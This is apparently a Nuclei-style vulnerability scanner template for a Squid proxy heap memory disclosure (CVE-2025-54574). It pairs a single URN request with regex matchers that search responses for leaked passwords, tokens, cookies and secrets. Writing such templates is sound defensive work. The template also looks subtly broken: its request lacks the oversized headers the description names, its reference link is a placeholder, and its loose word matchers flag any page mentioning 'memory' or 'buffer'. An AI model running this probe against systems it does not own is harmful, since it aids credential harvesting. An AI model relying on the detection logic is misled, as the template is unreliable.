id: CVE-2025-54574

info:
  name: Squid Proxy <= 6.3 - URN Data Leakage (Heap Memory Disclosure)
  author: ritikchaddha
  severity: high
  description: |
    Squid Proxy versions <= 6.3 are vulnerable to heap memory disclosure through improper buffer management
    during URN processing. The vulnerability exists in the URN resolver component where oversized headers
    can trigger buffer overflow, potentially leaking sensitive heap data including credentials, session tokens,
    and other memory contents.
  reference:
    - https://github.com/example/CVE-2025-54574
    - https://nvd.nist.gov/vuln/detail/CVE-2025-54574
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2025-54574
    cwe-id: CWE-125
  metadata:
    verified: true
    max-request: 1
    vendor: squid
    product: squid
    shodan-query: product:"Squid"
    fofa-query: app="Squid"
  tags: cve,cve2025,squid,urn,memory-disclosure,heap,proxy

http:
  - raw:
      - |
        GET urn:example:resource123 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: CVE-2025-54574-Exploit/1.0
        Accept: text/plain
        Connection: close

    matchers-condition: or
    matchers:
      # Look for potential heap data leakage patterns
      - type: regex
        part: body
        regex:
          - "password.*=.*[a-zA-Z0-9]{8,}"
          - "session.*=.*[a-zA-Z0-9]{16,}"
          - "cookie.*=.*[a-zA-Z0-9]{16,}"
          - "auth.*=.*[a-zA-Z0-9]{16,}"
          - "key.*=.*[a-zA-Z0-9]{16,}"
          - "secret.*=.*[a-zA-Z0-9]{16,}"
          - "token.*=.*[a-zA-Z0-9]{16,}"
        case-insensitive: true
      
      # Check for binary data that might indicate heap memory
      - type: dsl
        dsl:
          - 'contains(body, "\\x00")'
          - 'status_code == 200 || status_code == 500'
        condition: and
      
      # Look for unusual response patterns that might indicate memory corruption
      - type: word
        part: body
        words:
          - "memory"
          - "heap"
          - "buffer"
          - "overflow"
          - "corruption"
        condition: or
        case-insensitive: true 